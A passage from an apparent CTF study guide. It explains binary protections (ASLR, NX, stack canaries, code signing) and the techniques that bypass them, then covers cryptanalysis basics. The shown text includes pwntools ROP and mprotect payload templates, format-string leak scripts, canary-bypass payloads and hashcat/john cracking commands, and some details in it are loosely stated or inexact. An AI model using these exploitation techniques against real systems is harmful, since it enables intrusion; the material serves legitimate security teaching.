- **Executable base**: PIE (Position Independent Executable) binaries loaded at random offset

**Kernel-Level ASLR Control**

Check current ASLR status:

```bash
cat /proc/sys/kernel/randomize_va_space
```

Output values:

- `0` – ASLR disabled (fully predictable)
- `1` – Conservative ASLR (stack, heap, shared libraries; executable base fixed)
- `2` – Full ASLR (all mappings randomized including executable base)

Disable ASLR for reproducible debugging:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Re-enable ASLR:

```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

**Per-Process ASLR Bypass via setarch**

Run binary without ASLR:

```bash
setarch $(uname -m) -R ./binary arg1
```

`-R` disables address space randomization for single execution. Useful for consistent exploitation testing or when CTF environment allows.

**Detecting ASLR on Target**

Check binary PIE status:

```bash
file ./binary | grep -i pie
readelf -l ./binary | grep "DYNAMIC\|INTERP"
```

PIE indicates ASLR applies to executable itself.

Check if binary uses position-independent code:

```bash
objdump -d ./binary | head -20
```

[Inference] Instructions using RIP-relative addressing (mov rax, [rip + offset]) indicate position independence.

**ASLR Bypass Techniques for Exploitation**

**Address Leak via Information Disclosure**

Format string vulnerability:

```bash
# Binary vulnerable to: printf(user_input)
./binary "%x %x %x %x"
```

Leaks stack values including return addresses; calculate library base from leaked libc address.

Buffer over-read (CVE-style):

```bash
./binary "$(python3 -c "print('A'*64)")"
```

[Inference] Overflow reads adjacent stack memory containing leaked pointers or code addresses.

Use-after-free information leak:

```c
// Pseudo-code exploitation
malloc_ptr = vulnerable_alloc();
free_ptr(malloc_ptr);
read_leaked_data(malloc_ptr);  // Reads freed memory containing address
```

**Return-to-libc Without Address Knowledge**

Brute force libc base (on 32-bit or limited entropy):

```bash
for i in {1..1000}; do ./binary payload_$i; done
```

[Inference] On systems with reduced randomization entropy, repeated execution eventually hits valid libc address.

Use gadgets from binary itself:

```bash
objdump -d ./binary | grep -E "pop|ret|mov"
```

Binary base randomized with executable, but gadget offsets remain constant relative to binary base. If binary base leaked, all gadgets calculable.

**Chaining Leaks with Exploitation**

Two-stage exploit pattern:

```
Stage 1: Trigger information disclosure → leak libc base
Stage 2: Calculate ROP gadgets from leaked base → chain exploit
```

Example with format string:

```python
import subprocess

# Stage 1: Leak libc address
result = subprocess.run(['./binary', '%x %x %x'], capture_output=True, text=True)
leaked_addr = int(result.stdout.split()[2], 16)
libc_base = leaked_addr - LIBC_OFFSET  # Pre-calculated offset

# Stage 2: Build ROP chain using calculated base
pop_rdi_gadget = libc_base + 0x21b97
system_addr = libc_base + 0x46b40
```

**Entropy Measurement**

Calculate randomization bits:

```bash
for i in {1..100}; do ldd ./binary | grep libc | awk '{print $3}'; done | sort | uniq | wc -l
```

Shows how many unique libc base addresses appear across 100 runs. [Inference] Fewer unique addresses indicate reduced entropy, increasing brute-force feasibility.

**Linux-Specific ASLR Characteristics**

x86-64 with full ASLR: ~28 bits of entropy for heap/stack, ~16 bits for libraries (varies by kernel). x86 with ASLR: ~8 bits of entropy, significantly weaker. ARM/ARM64: Similar entropy distribution with architecture-specific variations.

---

## Data Execution Prevention (DEP/NX)

**Purpose**: Marks memory pages as non-executable (NX bit). Prevents shellcode execution from stack, heap, or data sections. Forces attackers to use return-to-libc or ROP chains instead of direct code injection.

**NX Bit Implementation**

Hardware mechanism: Memory Management Unit (MMU) enforces execute-disable for marked pages. Each page marked executable (X) or non-executable (NX).

Kernel enforcement: x86-64 with NX support (post-2003 CPUs) and modern kernels enable by default.

**Detecting NX Protection**

Check if binary has NX enabled:

```bash
checksec --file=./binary
```

Shows `NX enabled` or similar indicator.

Manual verification via readelf:

```bash
readelf -l ./binary | grep "GNU_STACK"
```

Output interpretation:

- `GNU_STACK ... RWE` – Stack executable (NX disabled)
- `GNU_STACK ... RW-` – Stack non-executable (NX enabled)

Check kernel NX support:

```bash
grep nx /proc/cpuinfo
```

`nx` flag present indicates CPU supports NX bit.

**Impact on Shellcode Injection**

Stack shellcode execution (blocked by NX):

```asm
; Traditional shellcode approach
mov rax, 0x3b
mov rdi, /bin/sh
syscall
```

With NX enabled, attempting to execute code on stack triggers segmentation fault.

NX bypass approaches:

- Return-to-libc: Chain existing libc functions
- ROP (Return-Oriented Programming): Use code already present in executable sections
- JOP (Jump-Oriented Programming): Jump chains instead of return chains
- Code injection into executable sections: [Inference] Requires write access to .text section, generally not feasible

**Return-to-libc Exploitation**

Basic structure (x86-64):

```python
# Set up arguments for system() call
rdi = "/bin/sh"  # First argument
system_addr = 0x7ffff7e00000 + 0x46b40  # libc base + system offset

# Craft ROP chain
rop_chain = [
    pop_rdi_gadget,
    pointer_to_bin_sh,
    system_addr,
    exit_addr  # Optional: clean exit
]
```

Build ROP payload:

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = elf.address + 0x1337  # Find via objdump
system_addr = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'A' * buffer_offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_addr)
```

**ROP Chain Construction**

Automated gadget discovery:

```bash
ropper --file ./binary --search "pop rdi; ret"
ROPgadget --binary ./binary --only "pop|ret"
```

Manual gadget extraction:

```bash
objdump -d ./binary | grep -B2 "ret"
```

Identifies function epilogues and returns usable as gadget endpoints.

[Inference] ROP chain works because: gadget sequences end with `ret`, which pops return address from stack (controlled by attacker), allowing chain to continue to next gadget.

**Advanced NX Bypass: Modify Code at Runtime**

mprotect() syscall to make memory executable:

```c
mprotect(shellcode_address, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC);
```

Exploitation chain:

```
1. Leak address of shellcode
2. Call mprotect() via ROP to mark region executable
3. Jump to now-executable shellcode
```

pwntools implementation:

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

mprotect_addr = libc.sym['mprotect']
shellcode_addr = 0x00007ffffffde000
shellcode_size = 0x1000

# Build ROP chain for mprotect
# x86-64 calling convention: rdi, rsi, rdx, rcx, r8, r9
payload = b'overflow_bytes'
payload += p64(pop_rdi_gadget)
payload += p64(shellcode_addr)
payload += p64(pop_rsi_gadget)
payload += p64(shellcode_size)
payload += p64(pop_rdx_gadget)
payload += p64(7)  # PROT_READ | PROT_WRITE | PROT_EXEC
payload += p64(mprotect_addr)
payload += p64(shellcode_addr)  # Jump to shellcode after mprotect
```

**Interaction with ASLR**

NX + ASLR: Address leak required for functional ROP chains. Without leak, gadget addresses unpredictable.

NX without ASLR: Hardcoded ROP chains viable; significantly simplifies exploitation.

Check combined protections:

```bash
checksec --file=./binary
```

Shows all protections simultaneously.

**Operating System Variations**

Linux: NX bit standard on modern kernels; enforced by default.

Windows: DEP (Data Execution Prevention) equivalent; similar mechanism with slightly different implementation details.

macOS: XN (eXecute Never) bit; comparable functionality to NX on Linux.

---

## Stack Canaries

**Purpose**: Places random value (canary) on stack before function return address. Function exit code verifies canary unchanged; if corrupted (stack overflow), program terminates before executing overwritten return address. Blocks straightforward stack buffer overflow exploitation.

**Canary Types and Detection**

Terminator canaries:

```
0x00000000 or 0x0000000000000000
```

Include null bytes; [Inference] null-byte overflow stops at first null, leaving canary intact (partial protection).

Random canaries:

```bash
gcc -fstack-protector-strong ./source.c -o binary
```

Compiler-generated random values; checked at function return.

Detect canary presence:

```bash
readelf -s ./binary | grep __stack_chk_fail
objdump -t ./binary | grep stack_chk
```

Symbol presence indicates stack protection enabled.

GCC Protection Levels:

- `-fno-stack-protector` – Disabled
- `-fstack-protector` – Protects functions with vulnerable operations (alloca, large buffers)
- `-fstack-protector-all` – Protects all functions
- `-fstack-protector-strong` – Heuristic protection; good default

**Canary Layout on Stack**

x86-64 stack frame with canary:

```
[Higher addresses]
Return Address
Canary ← Checked before return
Local variables
[Lower addresses]
```

Overflow overwrites in order: local variables → canary → return address. Corrupting return address without corrupting canary triggers crash.

**Canary Bypass Techniques**

**Leak Canary Value**

Format string vulnerability:

```bash
./binary "%p %p %p %p"
```

[Inference] Canary often on stack; leaked via format string before using in overflow.

Buffer over-read:

```python
payload = b'A' * 100
result = binary_read(payload)
canary = extract_canary_from_output(result)
```

**Off-by-One Overflow**

Single-byte overflow past buffer:

```c
char buffer[16];
fgets(buffer, 17, stdin);  // Reads 17 bytes into 16-byte buffer
```

[Inference] Overwrites single byte after buffer; with careful alignment, corrupts only least-significant byte of canary or leaves canary intact while corrupting return address high byte.

**Canary Prediction on Weak Systems**

Terminator canary (null bytes):

```python
# Canary is predictable: 0x00000000
canary = b'\x00\x00\x00\x00'
payload = b'A' * 16 + canary + b'B' * 8 + p64(return_address)
```

[Unverified] Some older systems or embedded environments use non-random canaries; verify via analysis of multiple runs.

**Thread-Local Storage Canary Extraction**

Canary stored in TLS (Thread-Local Storage):

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) print *(unsigned long *)(__libc_stack_end)
```

[Inference] On some systems, canary accessible through TLS offset.

**Canary Bypass via Function Pointer Corruption**

Overflow targeting function pointer before canary check:

```c
void (*func_ptr)() = legitimate_function;
char buffer[16];
strcpy(buffer, user_input);  // Overflow
// If func_ptr corrupted before canary checked, exploitation possible
(*func_ptr)();  // Call corrupted function pointer
```

[Inference] Function pointers stored below stack canary in certain memory layouts; overflow between pointer and canary enables arbitrary code before canary check triggers.

**Canary Bypass via Stack Pivot**

Overflow to control stack pointer (RSP), then return:

```python
# Overflow to set RSP to attacker-controlled region
# RSP points to fake stack with no canary check
payload = overflow + rop_gadget_pivot + attacker_stack
```

Gadget: `mov rsp, rax; ret` allows redirecting execution away from canary-protected frame.

**Canary in CTF Context**

Identify canary bytes in memory:

```bash
gdb ./binary
(gdb) break vulnerable_function
(gdb) run < payload
(gdb) x/16x $rsp
```

Canary typically 8-byte value; often readable if binary not fully randomized.

Multi-stage exploitation with canary leak:

```
Stage 1: Leak canary via format string or overflow
Stage 2: Use leaked canary in overflow payload
```

**Protection Strength Assessment**

Canary + ASLR + NX: Very strong; requires multiple bypasses (leak + ROP).

Canary alone: Weak against certain attacks (function pointer corruption, stack pivot).

Canary + no ASLR: Vulnerable to off-by-one or direct canary prediction.

**Disabling Canary for Testing**

Compile without canary:

```bash
gcc -fno-stack-protector ./source.c -o binary_no_canary
```

Compare canary-protected vs. unprotected:

```bash
gdb ./binary
(gdb) disassemble main
```

No canary version lacks `__stack_chk_fail` references.

---

## Code Signing and Verification

**Purpose**: Cryptographically signs executable code; verifies signature before execution or loading. Prevents unauthorized code modification and execution of tampered binaries. Defeats simple binary patching exploitation techniques.

**Digital Signature Implementation**

Signature components:

- **Private key**: Signer holds exclusively; used to create signature
- **Public key**: Distributed with binary or embedded in kernel/bootloader
- **Hash**: Cryptographic hash of code (typically SHA-256 or SHA-1)
- **Signature**: Encrypted hash using private key; verifiable with public key

Verification process:

```
1. Compute hash of received code
2. Decrypt signature using public key → original hash
3. Compare computed vs. decrypted hash
4. If match: code authentic and unmodified
5. If mismatch: code tampered; execution blocked
```

**Operating System-Level Code Signing**

**Linux: Secure Boot and Module Signing**

Check Secure Boot status:

```bash
mokutil --sb-state
# or
efivar -l | grep SecureBoot
```

Sign kernel module:

```bash
/usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 privkey.pem certificate.x509 module.ko
```

Verify module signature:

```bash
modinfo module.ko | grep signature
```

**Windows: Code Signing with Digital Certificates**

Sign executable:

```powershell
signtool sign /f certificate.pfx /p password /t http://timestamp.server /fd SHA256 binary.exe
```

Verify signature:

```powershell
signtool verify /pa binary.exe
Get-AuthenticodeSignature binary.exe
```

Check certificate chain:

```powershell
$sig = Get-AuthenticodeSignature binary.exe
$sig.SignerCertificate | Select-Object Subject, Thumbprint
```

**macOS: Gatekeeper and Code Signing**

Sign application:

```bash
codesign --sign "Developer ID Application" app.app
```

Verify signature:

```bash
codesign -v app.app
codesign -d -v app.app
```

Check entitlements:

```bash
codesign -d --entitlements :- app.app
```

**Defeating Code Signing: Practical CTF Scenarios**

[Inference] In controlled CTF environments, code signing defeats depend on specific implementation details.

**Signature Bypass via Private Key Compromise**

If private key accessible (CTF scenario):

```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

Create new signature:

```bash
openssl dgst -sha256 -sign private.pem binary > signature.bin
```

Inject modified binary with valid signature.

**Signature Stripping (Vulnerability-Dependent)**

[Unverified] On some systems, removing or modifying signature data without affecting code execution (depends on verification implementation).

Check signature location in PE:

```bash
objdump -h binary.exe | grep "Certificate"
```

**Downgrade Attack: Require Older Signature Algorithm**

Some systems accept multiple signature types; exploiting weaker algorithm:

```bash
# Binary signed with strong SHA-256
# System accepts legacy SHA-1
# Re-sign with SHA-1, potentially bypassing newer verification
```

[Unverified] Effectiveness depends on system configuration.

**Kernel-Level Signature Verification Bypass**

Modify kernel verification routine (kernel exploit):

```bash
# Patch __vfs_read or similar to skip signature check
# Requires kernel exploitation; beyond typical user-space CTF
```

**Hypervisor/Firmware Exploitation**

Disable Secure Boot via UEFI/firmware exploit; allows unsigned kernel loading. [Unverified] Firmware vulnerabilities extremely specific; depends on hardware and UEFI implementation.

**Coexistence with Other Protections**

Code signing + ASLR: Prevents binary modification but not address leak attacks.

Code signing + NX: Enforces execution of unmodified code, preventing shellcode injection.

Code signing + Canary: Protects both code integrity and stack integrity.

**Detection in CTF Binaries**

Check for embedded certificates:

```bash
objdump -s ./binary | grep -A 100 "certificate\|pem\|x509"
strings ./binary | grep -i "certificate\|public key\|signature"
```

Identify signature verification functions:

```bash
nm ./binary | grep -i "verify\|signature\|sign"
objdump -d ./binary | grep -E "verify|signature"
```

**Signature Verification Bypass via Race Condition**

[Inference] Binary signature verified once at load time; if memory page modified between verification and execution (time-of-check-time-of-use vulnerability), exploit possible.

```python
# TOCTOU exploitation pattern
# 1. Place malicious code at address
# 2. Signature verification occurs (passes)
# 3. Before execution, overwrite memory (race)
# 4. Malicious code executes
```

[Unverified] Practical exploitability extremely low on modern systems with synchronization mechanisms.

**CTF Approach: Circumventing Code Signing**

Identify signing mechanism:

```bash
checksec --file=./binary
file ./binary
strings ./binary | grep -i "sign"
```

Locate verification function:

```bash
gdb ./binary
(gdb) break verify_signature
(gdb) run
(gdb) disassemble
```

Patch verification (if allowed in CTF):

```bash
# Use objcopy to modify binary
objcopy --update-section .rodata=/dev/null binary_patched
```

[Inference] CTF binaries often include fake or bypassable signatures for learning purposes rather than production-grade cryptographic verification.

---

# Cryptanalysis Basics

## Symmetric Cryptography Recognition

### Block Ciphers

#### AES (Advanced Encryption Standard)

**Identification Characteristics:**

- **Block size:** 128 bits (16 bytes)
- **Key sizes:** 128, 192, or 256 bits
- **Round counts:** 10 (AES-128), 12 (AES-192), 14 (AES-256)

**Recognizing AES in Binaries:**

```bash
# Search for AES S-box constants
strings binary | grep -i aes
hexdump -C binary | grep "63 7c 77 7b"  # Start of AES S-box

# Look for characteristic constants
# AES S-box first bytes: 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5
```

**AES S-box Recognition Pattern:**

```
63 7c 77 7b f2 6b 6f c5 30 01 67 2b fe d7 ab 76
ca 82 c9 7d fa 59 47 f0 ad d4 a2 af 9c a4 72 c0
...
```

**In Ghidra/IDA:**

- Look for 256-byte lookup tables
- Identify ShiftRows, MixColumns operations
- Key expansion shows characteristic XOR patterns with round constants (Rcon)

**AES Modes of Operation:**

|Mode|IV Required|Parallelizable|Padding|Identification|
|---|---|---|---|---|
|ECB|No|Yes (encrypt/decrypt)|Yes|Identical plaintext blocks → identical ciphertext|
|CBC|Yes|Decrypt only|Yes|Each block XORed with previous ciphertext|
|CTR|Yes (nonce)|Yes (both)|No|Keystream XORed with plaintext|
|GCM|Yes|Yes (both)|No|Includes authentication tag|
|CFB|Yes|Decrypt only|No|Cipher used as stream cipher|
|OFB|Yes|No|No|Keystream independent of plaintext|

**ECB Detection (Critical Weakness):**

```bash
# Visual detection - convert to bitmap
convert -size 256x256 -depth 8 gray:encrypted.bin image.png
# Repeated patterns visible = likely ECB mode
```

#### DES/3DES (Data Encryption Standard)

**Identification:**

- **Block size:** 64 bits (8 bytes)
- **Key size:** 56 bits effective (64 with parity)
- **3DES key:** 168 bits (3 × 56)

**Recognition Pattern:**

```bash
# DES initial permutation table
# Look for this 64-byte table
58 50 42 34 26 18 10 02 60 52 44 36 28 20 12 04
62 54 46 38 30 22 14 06 64 56 48 40 32 24 16 08
...
```

**Practical Commands:**

```bash
# Attempt DES decryption
openssl des3 -d -in encrypted.bin -out decrypted.bin -K <hex_key> -iv <hex_iv>
```

#### Blowfish

**Identification:**

- **Block size:** 64 bits
- **Key size:** 32-448 bits (variable)
- **Characteristic:** Uses 18 P-array entries and 4 256-entry S-boxes

**Recognition:**

```bash
# Blowfish P-array initialization constants (derived from π)
243f6a88 85a308d3 13198a2e 03707344 a4093822 299f31d0 082efa98 ec4e6c89
```

#### ChaCha20 / Salsa20

**Identification:**

- **Stream cipher** (no padding)
- **Block size:** 512 bits (64 bytes) internal
- **Key size:** 256 bits
- **Nonce:** 64 or 96 bits

**Recognition Constants:**

```c
// ChaCha20 constants "expand 32-byte k"
0x61707865, 0x3320646e, 0x79622d32, 0x6b206574

// Salsa20 constants "expand 32-byte k"
0x61707865, 0x3320646e, 0x79622d32, 0x6b206574
```

**In Binary:**

```bash
strings binary | grep "expand 32-byte"
hexdump -C binary | grep "65 78 70 61 6e 64 20 33"
```

### RC4 (Rivest Cipher 4)

**Identification:**

- **Stream cipher**
- **Key size:** 40-2048 bits (typically 128)
- **S-box:** 256-byte permutation array
- **Key Scheduling Algorithm (KSA) + Pseudo-Random Generation Algorithm (PRGA)**

**Recognition Pattern:**

```python
# RC4 initialization - look for loop initializing 0-255
for i in range(256):
    S[i] = i
```

**In Assembly:**

```nasm
; RC4 KSA characteristic loop
xor eax, eax
loop_init:
    mov [S + rax], al
    inc eax
    cmp eax, 256
    jl loop_init
```

### Recognizing XOR-based Encryption

**Single-byte XOR:**

```bash
# Frequency analysis
python3 -c "
data = open('encrypted', 'rb').read()
for key in range(256):
    dec = bytes([b ^ key for b in data])
    if b'flag' in dec or b'CTF' in dec:
        print(f'Key: {key:#x}', dec)
"
```

**Multi-byte XOR Key Detection:**

```python
# Detect repeating key using Index of Coincidence
from collections import Counter

def hamming_distance(b1, b2):
    return sum(bin(x ^ y).count('1') for x, y in zip(b1, b2))

def find_keysize(ciphertext, min_size=2, max_size=40):
    scores = []
    for keysize in range(min_size, max_size + 1):
        blocks = [ciphertext[i:i+keysize] for i in range(0, len(ciphertext), keysize)][:4]
        distances = []
        for i in range(len(blocks)-1):
            distances.append(hamming_distance(blocks[i], blocks[i+1]) / keysize)
        scores.append((keysize, sum(distances) / len(distances)))
    return sorted(scores, key=lambda x: x[1])[:3]
```

## Hash Function Identification

### Common Hash Functions

|Hash|Output Size|Block Size|Recognition Pattern|
|---|---|---|---|
|MD5|128 bits (32 hex)|512 bits|Starts with A-F, 0-9, 32 chars|
|SHA-1|160 bits (40 hex)|512 bits|40 hex characters|
|SHA-256|256 bits (64 hex)|512 bits|64 hex characters|
|SHA-512|512 bits (128 hex)|1024 bits|128 hex characters|
|bcrypt|Variable|-|Starts with `$2a$`, `$2b$`, `$2y$`|
|NTLM|128 bits (32 hex)|-|Windows hash, often with username|

### Hash Recognition in Binaries

#### MD5

**Initialization Constants:**

```c
A = 0x67452301
B = 0xEFCDAB89
C = 0x98BADCFE
D = 0x10325476
```

**Identification Commands:**

```bash
# Search for MD5 constants
strings -t x binary | grep -i "67452301"
radare2 -qc "/x 67452301" binary

# In Ghidra: Search → For Scalars → 0x67452301
```

**Characteristic Operations:**

- 64 rounds of operations
- Uses functions F, G, H, I
- Rotation amounts: 7, 12, 17, 22 (repeating pattern)

#### SHA-1

**Initialization Constants:**

```c
H0 = 0x67452301
H1 = 0xEFCDAB89
H2 = 0x98BADCFE
H3 = 0x10325476
H4 = 0xC3D2E1F0  // Unique to SHA-1
```

**Recognition:**

```bash
strings binary | grep -i "c3d2e1f0"
```

**Characteristic:**

- 80 rounds
- Uses circular left rotate operations
- Message expansion from 16 to 80 words

#### SHA-256

**Initialization Constants (first 32 bits of fractional parts of square roots of first 8 primes):**

```c
0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a
0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
```

**Round Constants (K):**

```c
0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5
// ... 64 constants total
```

**Recognition:**

```bash
hexdump -C binary | grep "67 e6 09 6a"  # Little-endian
strings -t x binary | grep "6a09e667"    # Big-endian
```

#### SHA-512

**Similar to SHA-256 but:**

- Uses 64-bit words
- 80 rounds
- Different initialization constants

**First constant:**

```c
0x6a09e667f3bcc908  // Easy identifier
```

### Hash Cracking Tools

**hashcat - GPU-accelerated:**

```bash
# Identify hash type
hashcat --example-hashes | grep -B2 "32 hex"

# MD5 cracking
hashcat -m 0 -a 0 hash.txt wordlist.txt

# SHA-256
hashcat -m 1400 -a 0 hash.txt wordlist.txt

# bcrypt
hashcat -m 3200 -a 0 hash.txt wordlist.txt

# Common attack modes
# -a 0: Dictionary
# -a 1: Combinator  
# -a 3: Brute-force/Mask
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a  # 6 char all types
```

**john (John the Ripper):**

```bash
# Auto-detect format
john --format=raw-md5 hash.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Incremental mode (brute force)
john --incremental hash.txt
```

**hash-identifier:**

```bash
hash-identifier
# Paste hash, get likely types
```

### Custom Hash Verification

**Creating test hashes:**

```bash
# MD5
echo -n "test" | md5sum

# SHA-1
echo -n "test" | sha1sum

# SHA-256
echo -n "test" | sha256sum

# In Python
python3 -c "import hashlib; print(hashlib.md5(b'test').hexdigest())"
```

## Asymmetric Crypto Concepts

### RSA (Rivest-Shamir-Adleman)

**Mathematical Foundation:**

- **Public Key:** (n, e) where n = p × q (p, q are large primes)
- **Private Key:** (n, d) where d ≡ e⁻¹ (mod φ(n)), φ(n) = (p-1)(q-1)
- **Encryption:** c ≡ m^e (mod n)
- **Decryption:** m ≡ c^d (mod n)

**Common Key Sizes:**

- 1024-bit (deprecated, breakable)
- 2048-bit (standard)
- 4096-bit (high security)

**Recognition in Binaries:**

```bash
# Look for large number operations
# Modular exponentiation patterns
# ASN.1 DER encoded keys

openssl rsa -in key.pem -text -noout
# Shows: modulus (n), publicExponent (e), privateExponent (d), prime1 (p), prime2 (q)
```

**RSA Public Key Format (PEM):**

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
```

**Extracting RSA Parameters:**

```bash
# From PEM
openssl rsa -pubin -in public.pem -text -noout

# From binary (if found)
# Look for ASN.1 sequence: 30 82 ... (SEQUENCE tag)
```

**Common RSA Attacks:**

1. **Small Public Exponent (e=3) with Small Message:**

```python
# If m^3 < n, can recover m by taking cube root
import gmpy2
c = <ciphertext>
m = gmpy2.iroot(c, 3)[0]
```

2. **Common Modulus Attack:**

```python
# Two messages encrypted with same n but different e
# Can recover plaintext without private key
```

3. **Wiener's Attack (d < n^0.25):**

```bash
# Use RsaCtfTool
python3 RsaCtfTool.py -n <n> -e <e> --attack wiener
```

4. **Factoring Small n:**

```bash
# factordb.com - database of known factors
# msieve - general number field sieve
msieve -q <n>

# yafu - automated factoring
yafu "factor(<n>)"
```

### Elliptic Curve Cryptography (ECC)

**Common Curves:**

- **secp256k1** (Bitcoin, Ethereum)
- **P-256 (secp256r1)** (NIST standard)
- **Curve25519** (modern, efficient)
- **Ed25519** (EdDSA signatures)

**Recognition:**

```bash
# Curve parameters in binary
# Look for specific prime values
# secp256k1 prime: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F

strings binary | grep -i "curve"
strings binary | grep -i "ec_"
```

**Key Sizes:**

- 256-bit ECC ≈ 3072-bit RSA security level
- Smaller keys, faster operations than RSA

### Diffie-Hellman Key Exchange

**Discrete Log DH:**

- **Public parameters:** prime p, generator g
- **Alice:** sends g^a mod p
- **Bob:** sends g^b mod p
- **Shared secret:** g^(ab) mod p

**ECDH (Elliptic Curve):**

- More efficient than discrete log
- Uses elliptic curve points instead of modular exponentiation

**Recognition:**

```bash
# Look for modular exponentiation
# Large prime numbers
# "DH" or "DHE" in protocol strings
```

### Digital Signatures

**RSA Signatures:**

- Sign: s ≡ m^d (mod n)
- Verify: m ≡ s^e (mod n)

**ECDSA (Elliptic Curve):**

- Used by Bitcoin, TLS
- Signature: (r, s) pair
- Nonce reuse vulnerability (Sony PS3 hack)

**EdDSA:**

- Deterministic (no random nonce)
- Faster, simpler than ECDSA

## Common Implementations

### OpenSSL

**Version Detection:**

```bash
strings binary | grep -i "openssl"
strings binary | grep "OpenSSL"

# Check linked libraries
ldd binary | grep ssl
# libssl.so.1.1 = OpenSSL 1.1.x
# libssl.so.3 = OpenSSL 3.x
```

**Common Function Patterns:**

```c
// AES encryption
EVP_CIPHER_CTX_new()
EVP_EncryptInit_ex()
EVP_EncryptUpdate()
EVP_EncryptFinal_ex()

// SHA-256
SHA256_Init()
SHA256_Update()
SHA256_Final()

// RSA
RSA_new()
RSA_generate_key_ex()
RSA_public_encrypt()
RSA_private_decrypt()
```

**Finding OpenSSL Calls in IDA/Ghidra:**

```bash
# Search for imported functions
# Look for EVP_*, SHA*, RSA_*, AES_*, etc.

# In Ghidra: Window → Functions → Filter by name
# In IDA: View → Open subviews → Imports
```

**Command-Line OpenSSL Usage:**

```bash
# AES-256-CBC encryption
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin -k password

# Decryption
openssl enc -d -aes-256-cbc -in encrypted.bin -out decrypted.txt -k password

# Without password (raw key/IV)
openssl enc -aes-256-cbc -in plain.txt -out encrypted.bin -K <hex_key> -iv <hex_iv>

# RSA key generation
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# RSA encryption
openssl rsautl -encrypt -pubin -inkey public.pem -in plain.txt -out cipher.bin

# RSA decryption
openssl rsautl -decrypt -inkey private.pem -in cipher.bin -out plain.txt
```

### libsodium / NaCl

**Design Philosophy:**

- High-level API
- Safe defaults
- Modern algorithms only

**Common Functions:**

```c
// Authenticated encryption
crypto_secretbox_easy()      // XSalsa20-Poly1305
crypto_secretbox_open_easy()

// Public key encryption
crypto_box_easy()            // X25519-XSalsa20-Poly1305
crypto_box_open_easy()

// Signatures
crypto_sign()                // Ed25519
crypto_sign_open()

// Hashing
crypto_generichash()         // BLAKE2b
```

**Recognition:**

```bash
strings binary | grep "libsodium"
strings binary | grep "crypto_"

# Check linked libraries
ldd binary | grep sodium
```

**Algorithms Used:**

- **Encryption:** XSalsa20, ChaCha20
- **Authentication:** Poly1305
- **Hashing:** BLAKE2b
- **Key exchange:** X25519
- **Signatures:** Ed25519

### Python Cryptography Libraries

**PyCrypto / PyCryptodome:**

```python
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
```

**Recognition in .pyc files:**

```bash
strings script.pyc | grep -i "crypto"
# Look for import statements
```

**cryptography (Modern Python Library):**

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
```

## Weak Cryptographic Patterns

### Weak Algorithms (Deprecated/Broken)

**Never Use in Production:**

- **MD5:** Collision attacks practical since 2004
- **SHA-1:** Collision attack demonstrated (SHAttered, 2017)
- **DES:** 56-bit key breakable in hours
- **RC4:** Multiple biases, BEAST/CRIME attacks
- **ECB Mode:** Reveals patterns, not semantically secure

**Detection:**

```bash
# Static analysis with semgrep
semgrep --config "r/crypto" source_code/

# Manual source review
grep -r "MD5\|md5\|SHA1\|sha1\|DES\|RC4" source/
```

### Insecure Randomness

**Weak PRNGs:**

```c
// NEVER use for cryptography
srand(time(NULL));
int key = rand();  // Predictable!

// Correct: Use cryptographic RNG
#include <openssl/rand.h>
RAND_bytes(buffer, length);
```

**Detecting Weak Random in Binary:**

```bash
# Look for calls to rand(), srand(), time()
strings binary | grep -E "(rand|srand|time)"

# In Ghidra: Search for function calls
# rand@plt, srand@plt
```

**Predictable Seeds:**

```python
# Attack: Brute-force seed space
import random
import time

# If seed is time(NULL), try recent timestamps
for seed in range(int(time.time()) - 86400, int(time.time())):
    random.seed(seed)
    if random.randint(0, 100) == observed_value:
        print(f"Found seed: {seed}")
```

### Static/Hardcoded Keys

**Finding Hardcoded Keys:**

```bash
# Look for high-entropy strings
strings -n 16 binary | head

# Find hexadecimal patterns (potential keys)
strings binary | grep -E "^[0-9a-fA-F]{32,}$"

# Search for "key", "password", "secret"
strings binary | grep -i -E "(key|password|secret|token)"
```

**Entropy Analysis:**

```python
import math
from collections import Counter

def entropy(data):
    if not data:
        return 0
    counts = Counter(data)
    probs = [count / len(data) for count in counts.values()]
    return -sum(p * math.log2(p) for p in probs)

# High entropy (>7.5 for text) suggests encryption/encoding
data = open('binary', 'rb').read()
print(f"Entropy: {entropy(data):.2f} bits per byte")
```

### Weak Key Derivation

**PBKDF2 with Low Iterations:**

```python
# Vulnerable: only 1000 iterations
key = hashlib.pbkdf2_hmac('sha256', password, salt, 1000)

# Better: 100,000+ iterations (OWASP recommendation)
key = hashlib.pbkdf2_hmac('sha256', password, salt, 100000)
```

**Recognition in Source:**

```bash
grep -r "pbkdf2" . | grep -E "[0-9]{1,4}" # Low iteration count
```

### Padding Oracle Attacks

**Vulnerable Pattern (CBC mode):**

```python
# Server reveals padding validity through:
# - Different error messages
# - Timing differences
